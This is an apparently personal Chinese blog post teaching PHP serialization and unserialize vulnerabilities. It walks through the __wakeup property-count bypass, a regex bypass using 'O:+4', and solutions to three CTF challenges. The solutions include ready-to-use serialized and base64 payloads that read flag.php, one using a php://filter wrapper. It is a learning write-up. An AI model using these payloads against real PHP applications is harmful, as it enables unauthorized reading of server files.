---
title: "php反序列化学习"
categories: [ "php" ]
tags: [ "漏洞利用","漏洞复现","反序列化" ]
draft: false
slug: "563"
date: "2020-12-19 17:36:00"
---

# 事情起因

最近冲动买了高配台式，在把内存加到 32G 后有想把内网代理那篇文章写了的冲动了，再缓缓

如题，最近在查缺补漏，把一直听着说着没复现过的漏洞学习一下，准备开始批量刷 SRC 了

如果批量刷 SRC 有啥比较好的姿势我也会分享出来

这篇文章，从 php 的反序列化入手，来简单介绍下序列化，反序列化以及反序列化漏洞的概念以及一些例子

# 环境搭建

首先，编辑器还是一如既往地推荐`vsc`([visual studio code][1])

然后，你需要一个`php`环境，这里直接使用各种集成环境即可，用`wampp`,`xampp`都可以

我用的还是[phpstudy pro][2]，默认安装了`php7`的版本

安装完重新打开`vsc`，在`phpstudy`网站根目录新建保存一个`index.php`文件

`vsc`会自动帮你找到系统上注册的`php`路径,在文件按`shift + alt +f`进行快速代码格式化，会提示你没安装`php`格式化工具，点进去安装第一个就行

启动`Apache`，随便写个

```
<?php echo "hellow world!";
```

浏览器访问`127.0.0.1`你现在就拥有一个`php`环境了

# 概念学习

什么是序列化？

> php 程序为了保存和转储对象，提供了序列化的方法，php 序列化是为了在程序运行的过程中对对象进行转储而产生的。序列化可以将对象转换成字符串但仅保留对象里的成员变量，不保留函数方法

用一句话来概括序列化与反序列化：**序列化就是把一个对象转换成字符串，反序列化就是把字符串转换为对象**

下面来简单解释下，首先新建一段代码：

```
<?php


class Student
{
    public $name = "studentone";
    function getName()
    {
        return "soapffz";
    }
    function __construct()
    {
        echo "__construct";
        echo "</br>";
    }
}
$s = new Student();
echo $s->getName() . "</br>";
```

这是一个正常的调用类的方法：

![][3]

那么，序列化是什么意思呢？我们在最后加一段代码：

```
//serialize function把一个对象转换成字符串
$s_serilize = serialize($s);
print_r($s_serilize);
```

输出为：`O:7:"Student":1:{s:4:"name";s:10:"studentone";}`

这串序列化后得到的字符串的解释如下：

- O：这是一个对象类型
- 7；这个对象名称长度为 7
- Student：对象名
- 1：该对象含有一对键值
- s：该键类型为字符串
- 4：该键名长度为 4
- name：键名

剩下的依次类推，当然我的释义可能不太准确，建议去查下官方是怎么解释的

这就是一个序列化的过程，把这个对象的所有类型及包含的内容都变为了一段简单的格式化字符串数据

看下反序列化的过程：

```
<?php
$Student = 'O:7:"Student":1:{s:4:"name";s:10:"studentone";}';
$s_unserilize = unserialize($Student);
print_r($s_unserilize);
echo "</br>";
```

输出为；`Student Object ( [name] => studentone )`

这就是一个反序列化的过程，把一个标准的包含类型和数据的字符串反序列化了为一个对象

对象中常用的魔术方法如下：

- \_\_construct：在创建对象时候初始化对象，一般用于对变量赋初值。

- \_\_destruct：和构造函数相反，当对象所在函数调用完毕后执行。

- \_\_toString：当对象被当做一个字符串使用时调用。

- \_\_sleep:序列化对象之前就调用此方法(其返回需要一个数组)

- \_\_wakeup:反序列化恢复对象之前调用该方法

- \_\_call:当调用对象中不存在的方法会自动调用该方法。

- \_\_get:在调用私有属性的时候会自动执行

- **isset()在不可访问的属性上调用 isset()或 empty()触发**unset()在不可访问的属性上使用 unset()时触发

需要注意的是，这串字符串一定是前后一一对应的

比如前面对象处标明该对象只有一对键值 1，但是却在后面写了两对键值，就不能正常完成反序列化，**这也是后面反序列漏洞绕过\_\_wakeup()函数的关键**

# \_\_wakeup()函数漏洞

上面介绍的是序列化与反序列化的基本概念，下面用一个例子介绍下`php`反序列化漏洞的核心（到目前只接触到这个函数）

```
<?php
class Student{
public $full_name = 'zhangsan';
public $score = 150;
public $grades = array();

function __wakeup() {
echo "__wakeup is invoked";
}
}

$s = new Student();
var_dump(serialize($s));
```

- 最后页面上输出的就是 Student 对象的一个序列化输出：

- O:7:"Student":3:{s:9:"full_name";s:8:"zhangsan";s:5:"score";i:150;s:6:"grades";a:0:{}}

- 其中在 Stuedent 类后面有一个数字 3，整个 3 表示的就是 Student 类存在 3 个属性。

- wakeup()漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过 wakeup 的执行。

- 当我们将上述的序列化的字符串中的对象属性个数修改为 5，变为

- O:7:"Student":5:{s:9:"full_name";s:8:"zhangsan";s:5:"score";i:150;s:6:"grades";a:0:{}}

- 最后执行运行的代码如下：

```
<?php
class Student
{
    public $full_name = 'zhangsan';
    public $score = 150;
    public $grades = array();

    function __wakeup()
    {
        echo "__wakeup is invoked";
    }
    function __destruct()
    {
        var_dump($this);
    }
}

$s = new Student();
$stu = unserialize('O:7:"Student":5:{s:9:"full_name";s:8:"zhangsan";s:5:"score";i:150;s:6:"grades";a:0:{}}');
echo $stu;
```

![][4]

# ctf 例子 1

来自攻防世界 -> web 高手进阶区 -> [Web_php_unserialize][5]

![][6]

网页上放着的源代码如下：

```
<?php
class Demo
{
    private $file = 'index.php';
    public function __construct($file)
    {
        $this->file = $file;
    }
    function __destruct()
    {
        echo @highlight_file($this->file, true);
    }
    function __wakeup()
    {
        if ($this->file != 'index.php') {
            //the secret is in the fl4g.php
            $this->file = 'index.php';
        }
    }
}
if (isset($_GET['var'])) {
    $var = base64_decode($_GET['var']);
    if (preg_match('/[oc]:\d+:/i', $var)) {
        die('stop hacking!');
    } else {
        @unserialize($var);
    }
} else {
    highlight_file("index.php");
}
```

代码解释：

- 可以看到此代码生成类的函数和上面的简单例子变化不大：

- \_\_construct()，创建时自动调用，用得到的参数覆盖\$file

- \_\_destruct()，销毁时调用，会显示文件的代码，这里要显示 fl4g.php

- \_\_wakeup()，反序列化时调用，会把\$file 重置成 index.php

- 在类 Demo 中有三个方法，一个构造，一个析构，还有就是一个魔术方法，构造函数**construct()在程序执行开始的时候对变量进行赋初值。析构函数**destruct()，在对象所在函数执行完成之后，会自动调用，这里就会高亮显示出文件。

- 对 Demo 这个类进行序列化，base64 加密之后，赋值给 var 变量进行 get 传参就行了

- 如果一个类定义了 wakup()和 destruct()，则该类的实例被反序列化时，会自动调用 wakeup(), 生命周期结束时，则调用 desturct()

- 在 PHP5 < 5.6.25， PHP7 < 7.0.10 的版本存在 wakeup 的漏洞。当反序列化中 object 的个数和之前的个数不等时，wakeup 就会被绕过。

- 正则匹配可以用+号来进行绕过，也就是 O:4，我们用 O:+4 即可绕过

- isset() 函数用于检测变量是否已设置并且非 NULL。

- 如果已经使用 unset() 释放了一个变量之后，再通过 isset() 判断将返回 FALSE。

- 若使用 isset() 测试一个被设置成 NULL 的变量，将返回 FALSE。

- 同时要注意的是 null 字符（"\0"）并不等同于 PHP 的 NULL 常量。

- PHP 版本要求: PHP 4, PHP 5, PHP 7

在源代码之后加调用代码：

```
$a = new Demo("fl4g.php");
$a = serialize($a);
echo $a;
//O:4:"Demo":1:{s:10:" Demo file";s:8:"fl4g.php";}
$a = str_replace('O:4', 'O:+4', $a);
$a = str_replace('1:{', '2:{', $a);
echo $a;
//O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}
echo base64_encode($a);
//TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==
```

这里有个坑，注意代码的第四行`file`变量为`private`私有变量，所以序列化之后的字符串开头结尾各有一个空白字符（即%00），字符串长度也比实际长度大 2，如果将序列化结果复制到在线的`base64`网站进行编码可能就会丢掉空白字符，所以这里直接在`php`代码里进行编码。类似的还有`protected`类型的变量，序列化之后字符串首部会加上`%00*%00`

最后直接访问`你的靶场地址/index.php?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==`

即可得到`flag`

![][7]

# ctf 例子 2

来自攻防世界 -> web 高手进阶区 -> [unserialize3][8]

![][9]

```
class xctf{
public $flag = '111';
public function __wakeup(){
exit('bad requests');
}
?code=
```

打开网站，就这么一段代码，需要绕过`__weakup`函数，结果`?code=`的提示，需要将序列化之后的值传给`code`

首先实例化`xctf`类并对其使用序列化（这里就实例化`xctf`类为对象`test`）

```
<?php
class xctf
{                      //定义一个名为xctf的类
    public $flag = '111';            //定义一个公有的类属性$flag，值为111
    public function __wakeup()
    {      //定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本
        exit('bad requests');
    }
}
$test = new xctf();           //使用new运算符来实例化该类（xctf）的对象为test
echo (serialize($test));       //输出被序列化的对象（test）
//O:4:"xctf":1:{s:4:"flag";s:3:"111";}
```

- 我们要反序列化 xctf 类的同时还要绕过 wakeup 方法的执行（如果不绕过 wakeup()方法，那么将会输出 bad requests 并退出脚
  本），wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过 wakeup 的执行。因此，需要修改序列化字符串中的属性个数：

- 当我们将上述的序列化的字符串中的对象属性个数由真实值 1 修改为 2，即如下所示：

- O:4:"xctf":2:{s:4:"flag";s:3:"111";}

- 访问 url：?code=O:4:"xctf":2:{s:4:"flag";s:3:"111";}

- 即可得到 flag

![][10]

# ctf 例子 3

来自 2020 网鼎杯 青龙组 `WEB`题目 `AreUSerialz`，[ctfhub 靶场][11]中可以搜到

```
<?php
include("flag.php");
highlight_file(__FILE__);
class FileHandler
{
    protected $op;
    protected $filename;
    protected $content;
    function __construct()
    {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }
    public function process()
    {
        if ($this->op == "1") {
            $this->write();
        } else if ($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }
    private function write()
    {
        if (isset($this->filename) && isset($this->content)) {
            if (strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if ($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }
    private function read()
    {
        $res = "";
        if (isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }
    private function output($s)
    {
        echo "[Result]: <br>";
        echo $s;
    }
    function __destruct()
    {
        if ($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }
}
function is_valid($s)
{
    for ($i = 0; $i < strlen($s); $i++)
        if (!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}
if (isset($_GET{'str'})) {
    $str = (string)$_GET['str'];
    if (is_valid($str)) {
        $obj = unserialize($str);
    }
}
```

依然先看最后执行部分的代码：

```
if (isset($_GET{'str'})) {
    $str = (string)$_GET['str'];
    if (is_valid($str)) {
        $obj = unserialize($str);
    }
}
```

`GET`型传参`str，调用`is_valid()`方法判断，符合条件则对字符串化后的`str`进行反序列化操作，那么再来看`is_valid()`

```
function is_valid($s)
{
    for ($i = 0; $i < strlen($s); $i++)
        if (!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}
```

对传入参数的每一位的`ascii`码判断，需落在[32,125]之间，也就是判断是否为可见字符，否则返回`false`，反序列化操作不会进行，接下来看下`__destruct`析构方法

```
function __destruct()
    {
        if ($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }
```

如果 op==="2"，将其赋为"1"，同时`content`赋为空，进入`process`函数，

需要注意到的地方是，这里 op 与"2"比较的时候是强类型比较

- ===强类型比较 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较

- == 弱类型比较在进行比较的时候，会将字符转化为相同类型，再进行比较(如果比较涉及数字内容的字符串，则字符串会被转换成数值并且按照转化后的数值进行比较)

```
public function process()
    {
        if ($this->op == "1") {
            $this->write();
        } else if ($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }
```

进入 process 函数后，如果 op=="1"，则进入`write`函数，若 op=="2"，则进入 read 函数，否则输出报错，可以看出来这里 op 与字符串的比较变成了弱类型比较==

所以我们只要令 op=2,这里的 2 是整数`int`。当 op=2 时，op==="2"为`false`，op=="2"为 true，接着进入`read`函数

```
private function read()
    {
        $res = "";
        if (isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }
```

`filename`是我们可以控制的，接着使用`file_get_contents`函数读取文件，此处直接读取`flag.php`即可，有时候还会考察`php`伪协议，如果还遇到考察`php`伪协议的情况，直接把后面的`flag.php`改为

```
php://filter/read=convert.base64-encode/resource=flag.php
```

即可，此题没有考察到伪协议,获取到文件后使用`output`函数输出

整个利用思路就很明显了，还有一个需要注意的地方是，$op,$filename,\$content 三个变量权限都是 protected，而`protected`权限的变量在序列化的时会有%00\*%00 字符，%00 字符的`ASCII`码为 0，就无法通过上面的`is_valid`函数校验

现在先来生成序列化字符串吧，将`$filename`改为我们要读的文件：

```
<?php
class FileHandler
{

    protected $op=2;
    protected $filename="flag.php";
    protected $content="";
}

$ff=new FileHandler();
echo serialize($ff);
```

生成如下：

```
O:11:"FileHandler":3:{s:5:"*op";i:2;s:11:"*filename";s:8:"flag.php";s:10:"*content";s:0:"";}
```

需要注意的是，`protected`类型的成员变量序列化会生成`%00，会被`false`掉，`php7`对于类的属性不敏感，可以改用`public`类型就可以了

```
O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";s:0:"";}
```

此时可以进行传参了：

```
?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";s:0:"";}
```

右键查看网页源代码即得`flag`：

![][12]

参考文章：

- [小白也能学会的反序列化漏洞][13]
- [2020 网鼎杯青龙组部分 Web 复现][14]
- [网鼎杯 2020 青龙组 AreUSerialz][15]
- [记一次对 CTF 青龙组历年真题的自我理解][16]

[1]: https://code.visualstudio.com/Download
[2]: https://www.xp.cn/
[3]: https://img.soapffz.com/archives_img/2020/12/19/archives_20201219_164636.png
[4]: https://img.soapffz.com/archives_img/2020/12/19/archives_20201219_174322.png
[5]: https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5409&page=1
[6]: https://img.soapffz.com/archives_img/2020/12/19/archives_20201219_171426.png
[7]: https://img.soapffz.com/archives_img/2020/12/19/archives_20201219_171520.png
[8]: https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4821&page=1
[9]: https://img.soapffz.com/archives_img/2020/12/19/archives_20201219_172032.png
[10]: https://img.soapffz.com/archives_img/2020/12/19/archives_20201219_172109.png
[11]: https://www.ctfhub.com/#/
[12]: https://img.soapffz.com/archives_img/2020/12/19/archives_20201225_222921.png
[13]: https://www.bilibili.com/video/av53361627?p=1&t=476
[14]: http://keac.club/2020/05/11/2020%E7%BD%91%E9%BC%8E%E6%9D%AFweb/
[15]: https://www.cnblogs.com/Cl0ud/p/12874458.html
[16]: https://mp.weixin.qq.com/s/ZKwR4fZU-j1QXcQBTFF7PQ